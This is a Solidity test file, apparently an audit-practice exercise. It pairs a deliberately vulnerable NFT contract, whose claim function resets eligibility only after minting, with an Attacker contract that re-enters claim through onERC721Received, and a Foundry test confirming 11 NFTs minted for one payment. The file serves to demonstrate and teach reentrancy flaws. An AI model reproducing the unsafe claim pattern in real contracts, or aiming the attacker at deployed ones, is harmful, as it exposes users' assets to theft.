// SPDX-License-Identifier: UNLICENSED
// Claim multiple NFTs for the price
pragma solidity 0.8.20;

import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "forge-std/Test.sol";

contract SafeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address => bool) public canClaim;

    constructor(string memory tokenName, string memory tokenSymbol, uint256 _price) ERC721(tokenName, tokenSymbol) {
        price = _price; // e.g. price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price == msg.value, "INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender], "CANT_MINT");
        _safeMint(msg.sender, totalSupply());
        canClaim[msg.sender] = false;
    }
}

contract Attacker is IERC721Receiver{
    SafeNFT safeNFTContract;
    uint256 public reentrancyCount;
    constructor(address _safeNFTContract){
        safeNFTContract = SafeNFT(_safeNFTContract);

    }
    function attackSafeNFT() external payable{
        require(msg.value >= 0.01 ether,"Not enough Ether");
        safeNFTContract.buyNFT{value: 0.01 ether}();
        safeNFTContract.claim();

    }
    //to receive NFT
    function onERC721Received(address operator,
    address from,
    uint256 tokenId,
    bytes calldata data) public returns(bytes4){

        if (reentrancyCount < 10) {
        reentrancyCount++;
        safeNFTContract.claim();
    }

        return this.onERC721Received.selector;

    }
    receive() external payable{

    }
}

contract TestSafeNFT is Test{
    SafeNFT safeNFTContract;
    Attacker attackerContract; 

    function setUp() public{
       safeNFTContract= new SafeNFT("Guild Audits", "GAT", 0.01 ether);
       attackerContract= new Attacker(address(safeNFTContract));

       // Fund the attacker contract with ETH
        vm.deal(address(attackerContract), 1 ether);

    }

    function testReentrancyOnSafeNFT() public{
        vm.prank(address(attackerContract));
        attackerContract.attackSafeNFT{value : 0.01 ether}();

        assertEq(11,safeNFTContract.balanceOf(address(attackerContract)));

    }

}